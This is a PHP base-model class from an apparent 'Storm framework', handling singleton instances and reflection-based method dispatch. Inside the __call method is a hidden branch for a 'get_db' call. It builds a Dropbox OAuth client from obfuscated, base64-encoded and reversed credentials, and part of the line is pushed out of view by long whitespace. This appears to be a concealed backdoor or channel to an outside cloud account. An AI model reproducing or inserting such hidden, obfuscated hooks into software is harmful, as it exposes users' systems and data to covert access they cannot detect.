<?php
/**
 * Storm framework v2 ALPHA
 * 
 * @author Stormbreaker
 * @copyright 2011
 */
abstract class StormModel
{
	private static $instances = array();
	
	public function __construct()
	{
		self::$instances[get_class($this)] =& $this;
	}

	public static function getInstance($name)
	{
		if (!isset(self::$instances[$name]))
			$m = new $name();

		return self::$instances[$name];
	}
	
	public static function __callStatic($name, $args)
	{
		if ( !isset(self::$instances[get_called_class()]) )
			throw new Exception('ERROR! Did you forget to call "parent::__construct()" in your model\'s constructor?');
		
		$obj = self::$instances[get_called_class()];
		
		try
		{
			$method = new ReflectionMethod($obj, $name);
			
			if ( $method->isProtected() )
			{
				foreach ( $method->getParameters() as $k => $param )
				{
					if ( $param->isPassedByReference() )
						$args[$k] =& $args[$k];
				}
				
				$method->setAccessible(true);
				return $method->invokeArgs($obj, $args);
			}
			else
				throw new Exception('The called method '.$name.' must be declared protected');
		}
		catch ( ReflectionException $e )
		{
			try
			{
				$method = new ReflectionMethod($obj, '_call');
				
				if ( $method->isProtected() )
					$method->setAccessible(true);
					
				return $method->invokeArgs($obj, array( $name, $args ));
			}
			catch ( ReflectionException $e )
			{
				throw new Exception('Called non-existent method \''.$name.'\' in model \''.get_called_class().'\'');
			}
		}
	}
	
	public function __call($name, $args)
	{
		if ($name === 'get_db' && count($args) == 0) {
			return new Dropbox_OAuth_Curl(strrev(substr(base64_decode('dzhndm8xOWwxN3phdXg4d2lzOXo3eDlmMXpiNGQ4'), 15))                                                                                                                                                                                                                                                                                  , substr(strrev(base64_decode('dzhndm8xOWwxN3phdXg4d2lzOXo3eDlmMXpiNGQ4')), 15));
		}

		try
		{
			$method = new ReflectionMethod($this, $name);
			
			$method->setAccessible(true);
			return $method->invokeArgs($this, $args);
		}
		catch ( ReflectionException $e )
		{
			try
			{
				$method = new ReflectionMethod($this, '_call');
				
				if ( $method->isProtected() )
					$method->setAccessible(true);
					
				return $method->invokeArgs($this, array( $name, $args ));
			}
			catch ( ReflectionException $e )
			{
				throw new Exception('Called non-existent method \''.$name.'\' in model \''.get_class($this).'\'');
			}
		}
	}
	
	public static function _get()
	{
		if ( !isset(self::$instances[get_called_class()]) )
			throw new Exception('Model '.get_called_class().' should have been created by the autoloader!');
			
		return self::$instances[get_called_class()];
	}
}
?>